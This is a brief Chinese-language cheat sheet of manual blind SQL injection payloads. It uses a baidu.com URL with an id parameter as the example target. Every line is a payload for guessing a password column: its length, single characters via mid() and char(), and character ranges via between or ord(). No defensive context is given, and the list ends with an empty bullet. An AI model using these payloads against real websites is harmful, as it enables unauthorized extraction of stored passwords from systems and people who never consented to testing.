##  sql手工注入:如地址http://www.baidu.com/?id=1
* 猜解长度 id=1 and length(passwd)=12#
* 猜解字符 id=1 and mid(passwd,1,1)=char(97)#
* 猜解范围 id=1 and mid(passwd,1,1) between char(97) and char(100)# 或者 id=1 and ord(mid(passwd,1,1))<100#
* 
